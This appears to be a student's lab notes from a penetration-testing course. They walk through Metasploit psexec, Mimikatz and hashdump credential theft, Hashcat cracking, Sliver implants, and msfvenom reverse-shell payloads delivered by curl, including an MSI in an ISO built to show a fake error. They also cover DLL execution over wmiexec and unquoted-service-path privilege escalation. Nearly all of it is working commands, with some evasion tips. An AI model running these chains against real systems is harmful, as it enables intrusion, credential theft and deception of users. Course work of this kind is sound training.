## MSF psexec, hashdumping, and Mimikatz

1: Look for Admin Rights
There are 2 requirements to use the exploit/windows/smb/psexec module against remote Windows systems:
1. We need an account with administrative access on the target.
2. The target system needs to be listening on SMB port, TCP 445.

using the list of open port 445 hosts from nmap, you can run nxc to see if you have access

`nxc smb 445.tcp -u bgreen -p Password1 |tr -s [:space:] |grep 'Pwn3d!'`

2: Metasploit & exploit/windows/smb/psexec
Now, we're going to use one of the most useful and reliable modules in the Metasploit framework, the psexec module.
```
msfconsole -q -x "
use exploit/windows/smb/psexec; 
set RHOST 10.130.10.5; 
set LHOST tun0; 
set SMBUser bgreen; 
set SMBDomain hiboxy; 
set SMBPass Password1
"
```
Let's look at one more thing before we launch the exploit. As we have seen, show options shows the main settings for Metasploit modules. But there are dozens of additional variables for most modules available via their advanced settings. We can see these options by running show advanced. Let's try it.

`show advanced`

Here we can see numerous options letting us specify things like the local client port (CPORT) to use in launching an attack, an indication of whether or not to make a persistent service that will run every time the system boots so we'd automatically get a Meterpreter session sent back at system boot (SERVICE_PERSIST), and a setting of SERVICE_FILENAME. This variable can be set to a name that the payload file will be written into on the target machine so that the service can execute it. Again, by default, the SERVICE_FILENAME is a pseudorandom string. To be subtle, we may want to change that to something that is more likely to be expected on a target machine, such as svchost.

3: Launch the Attack
just use command: `run`

then on any sessions made we can run, 
```
info /post/windows/gather/smart_hashdump
run /post/windows/gather/smart_hashdump
```

4: Running Mimikatz
We'll now extract credentials from the WEB01 computer (10.130.10.5) from memory using Mimikatz.

Let's take a look at our current session by running sysinfo.

Let's find a 64-bit SYSTEM processes on the target using the ps command. We need to search for 64-bit processes (-A x64) that are running with SYSTEM-level permissions (-s, lowercase s).

`ps -A x64 -s`

When migrating, do not migrate into any of the processes named svchost.exe. In the real world, when selecting a process to migrate into, think of the processes that will be less likely to have a significant impact to the system if the process were to crash. A common choice is spoolsv (Print Spooler), since it isn't needed on most systems.

`migrate -N spoolsv.exe`

now let's load mimkatz, `load kiwi`

then run mimikatz: `creds_all`

## Cracking passwords with Hashcat

searching for hacking md5's through hashcat: `hashcat -hh | grep md5crypt`

Let's now do some performance benchmarking, starting with -m 3000, which is for LM hashes. Note that we'll invoke Hashcat with the -w 3 flag, meaning that we want a Workload Profile (-w) number 3. The various options for -w include:

1: Low. Minimal impact on GUI performance and low power consumption
2: Default. Noticeable impact on GUI and economic power consumption
3: High. High power consumption and potentially unresponsive GUI
4: Nightmare. Insane power consumption and a headless server because the GUI will not have enough CPU or GPU to respond
For this lab, we'll use -w 3 because we can often reasonably get about 30% higher performance, and the GUI will be responsive enough for us to conduct the lab.

Next, let's perform some performance measures of Hashcat for common hashing algorithms.

`hashcat -w 3 --benchmark -m 3000`

Next, let's look at the performance of cracking salted MD5 (md5crypt) hashes by running:

`hashcat -w 3 --benchmark -m 500`

And finally, let's look at the performance characteristics of sha512crypt, the $6$ hashes associated with some Linux machines:

`hashcat -w 3 --benchmark -m 1800`

2: Cracking with Hashcat
create a directory for cracking: `mkdir cracking && cd cracking`

setting up symbolic links: 
```
These symbolic links will shorten up our commands a bit, especially when we start using rules.
```

Next, lets create a hashes folder for all of our password dumps, and copy our dumps into it.

`mkdir hashes && cp ~/labs/web* hashes/ && ls -1 hashes`

`hashcat -w 3 -a 0 -m 1000 hashes/web01.hashes wordlists/rockyou.txt`

As you can see, Hashcat has a lot of different rules files. Let's look at one of the most useful, best66.rule:
`head -n 30 rules/best66.rule`

`hashcat -w 3 -a 0 -m 1000 hashes/web01.hashes wordlists/rockyou.txt -r rules/best66.rule`

When that finishes running, let's look at our results:

`hashcat -m 1000 --username --show --outfile-format 2 hashes/web01.hashes`

3: Hashcat and Masking
`hashcat -w 3 -a 6 -m 1000 hashes/web01.hashes dict/american-english-insane ?d?d -j 'c'`

4: Cracking Linux Passwords with Hashcat
Let's crack the hashes from web10 using Hashcat, specifically the $6$ hashes associated with sha512crypt.

`hashcat -m 1000 --show --outfile-format 2 hashes/web01.hashes | tee web01_passwords.txt`

Now let's use Hashcat to crack some Linux hashes!

`hashcat -w 3 -a 0 -m 1800 hashes/web10.shadow web01_passwords.txt -r rules/best66.rule`

Let's take a look at hashcat's potfile:

`cat ~/.local/share/hashcat/hashcat.potfile`

this contains all the hashes and passwords we've cracked

## Sliver

start server on linux: `sudo sliver-server`

turn on multiplayer: `multiplayer`

create new operator: 
```
new-operator -h
new-operator -n zerocool -s /tmp/ -l LINUX_ETH0_ADDRESS
```

2: Creating a listener and an implant payload

start https listener: `https`

Let's look at building a payload `generate -h`

let's build a windows payload to connect back to our listener:
`generate --os windows --skip-symbols --name first --http LINUX_ETH0_ADDRESS --permissions all`

Sliver does heavy encryption and obfuscation of the payloads. It is a great feature, but it can take a while to generate the payloads. To speed up the lab, we use --skip-symbols to skip this step. In the real world, you won't want to use this option.

3: Sending the Payload to the Windows system
Let's open up the permissions on the file (since you may have run the generate command under the sliver-server prompt which is running as root), then serve it via Python.

```
sudo chmod o+r first.exe
python3 -m http.server
```

Switch to your Windows host and open the Terminal shortcut on your desktop. Move to your desktop and download the file.

```
cd Desktop
curl.exe http://LINUX_ETH0_ADDRESS:8000/first.exe -o first.exe
```

4: Executing the Payload
On your windows system, double click first.exe on your Desktop.

Take a look at our session with sessions.
`sessions`

then use session with use: `use 11`

5: Interacting with the session
Let's first get some information on the compromised system.

```
getuid 
getgid
```

can run `whoami` as well

If you want all this information (and more) with a single command, run the info command.

`info`

6: Shell
Similar to Metasploit, we can drop to a command shell with the shell command.

`shell`

exit with `exit`

7: Execute Assembly - SharpWMI
`execute-assembly /home/sec560/labs/SharpWMI.exe`

running sharpWMI to get a list of logged in users:
`execute-assembly /home/sec560/labs/SharpWMI.exe action=loggedon`

## Payloads

1: Setup Metasploit to receive a connection

```
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_http
set LHOST eth0
set LPORT 3333
set ExitOnSession false
run -j -z
```

2: Metasploit Payloads with MSFVenom
```
msfvenom --list formats
msfvenom -p windows/meterpreter/reverse_http lhost=eth0 lport=3333 -f vbs | tee /tmp/payload.vbs
```

3: Copying the VBS payload to Windows and execute it
```
cd /tmp
python3 -m http.server

# now run from windows
curl http://LINUX_ETH0_ADDRESS:8000/payload.vbs -o payload.vbs
cscript payload.vbs

# back on metasploit
sessions -i 1
sysinfo
```

4: Creating an MSI payload in an ISO file
```
msfvenom -p windows/meterpreter/reverse_http LHOST=eth0 LPORT=3333 -f msi -o /tmp/setup.msi

#To create an ISO file, we'll use the genisoimage tool. We can specify a directory or one or more files. We'll use the msi file in the ISO file.

genisoimage -o /tmp/installer.iso /tmp/setup.msi
```

5: Download and open ISO and MSI files
```
cd C:\Users\sec560\Desktop
curl http://LINUX_ETH0_ADDRESS:8000/installer.iso -o installer.iso
```

On your desktop you will now see installer.iso. Double click the file to mount it. Then, double click the SETUP.MSI file to run it.

Click Yes on the User Account Control prompt.

You'll see the installer run, but then it displays an error message.

There is a problem with this Windows Installer package. A script required for this install to complete could not be run. Contact your support personnel or package vendor.

This error message is expected. It is used to trick the user into thinking that nothing happened. However, if you switch to Metasploit you will see a new Meterpreter session has just been initiated.

6: Sliver and Payloads
```
sudo sliver-server
https
generate --os windows --arch 64bit --format shared --skip-symbols --http https://LINUX_TUN0_ADDRESS
```

7: Copying and executing the DLL
Note that the rwx (Read, Write, Execute) permission only apply to the owner of the file, root. Let's change the permissions on the file so we can interact with the file as a regular user.

```
sudo chown sec560:sec560 *.dll
ls -l *.dll
```
You should now see that the owner of the file is sec560.

We're going to use two tools from the Impacket framework. We'll discuss the tools in more depth in 560.4, but we need to use the tools now.

First, we will use smbclient.py to copy the file to a server. We'll use the c$ share and then upload (put) the file.

```
smbclient.py hiboxy/bgreen:Password1@10.130.10.25
use c$
put PAYLOAD_NAME.dll
ls
exit
```

You should see your DLL file on the root of the drive on the remote server.

Let's use another Impacket tool to execute the payload, wmiexec.py.

```
wmiexec.py hiboxy/bgreen:Password1@10.130.10.25
regsvr32 PAYLOAD_NAME.dll
```

You should see the session come in from the server to Sliver.

## Seatbelt
1: Launching Seatbelt

```
cd \bin
Seatbelt.exe
```

running individual checks:
```
seatbelt.exe antivirus
seatbelt.exe Installedproducts
Seatbelt.exe TcpConnections
```

3: Groups
instead of running individual checks can run groups of commands
The command groups currently supported by Seatbelt are:

- All - all commands
- User - current user or all users if logged running with elevated permissions
- System - mines interesting data about the target system
- Slack - modules designed to extract information about slack (is it installed, downloads, and workspaces)
- Chromium - extracts information regarding Chromium-based browsers (are they installed, bookmarks, history)
- Remote - checks that work on remote systems (very interesting before any lateral movement)
- Misc - miscellaneous checks

```
Seatbelt.exe -group=system
```

4: Remote Usage
Recall that commands that can be run remotely are prefixed with a +. Let's look at the commands we can run remotely to get information from another hosts.

`Seatbelt.exe | findstr +`

Let's run the UAC module against the 10.130.10.25 system.

`Seatbelt.exe UAC '-computername=10.130.10.25' -username=hiboxy\bgreen -password=Password1`

## Windows Privilege Escalation

1. Log on to Windows
loggin in as a notadmin with creds: notadmin:notadmin

2. Run PowerUp.ps1
```
Import-Module C:\bin\PowerUp.ps1
Invoke-AllChecks
```

3. Review PowerUp's results
PowerUp should come back with a few possibly interesting results:

The unquoted service path for service Video Stream
A number of possible DLL hijacking vulnerabilities in %PATH% directories
A number of vulnerabilities related to service executables and permissions
4. Review the 'Video Stream' service in services view
Let's open the services.msc view inside the existing PowerShell window:
`services.msc`

In the services list, scroll to the Video Stream service and double-click it. You will see the details linked to the Video Stream service and notice that the Path to executable does not have quotes around it.

5. Exploiting the vulnerability using PowerUp
To try this for the vulnerable Video Stream service, we need to scroll a bit up to the first few reported results and copy the AbuseFunction that is reported: Write-ServiceBinary -ServiceName 'Video Stream' -Path \<HijackPath>

6. Adapt the "HijackPath"
We are abusing the unquoted service path issue that was explained during the course. As the actual service executable is located in the C:\Program Files\VideoStream\1337 Log\ folder and there are no spaces around the full path, Windows will also attempt to execute C:\Program.exe or C:\Program Files\VideoStream\1337.exe.

`Write-ServiceBinary -ServiceName 'Video Stream' -Path 'C:\Program Files\VideoStream\1337.exe'`

7. Reboot the computer
Once the PowerShell abuse function has run, verify if the C:\Program Files\VideoStream\1337.exe file exists. If it does, we now need to restart the service, so the executable gets run as NT AUTHORITY\SYSTEM.

now when signing back in you can verify that john, has been granted admin rights

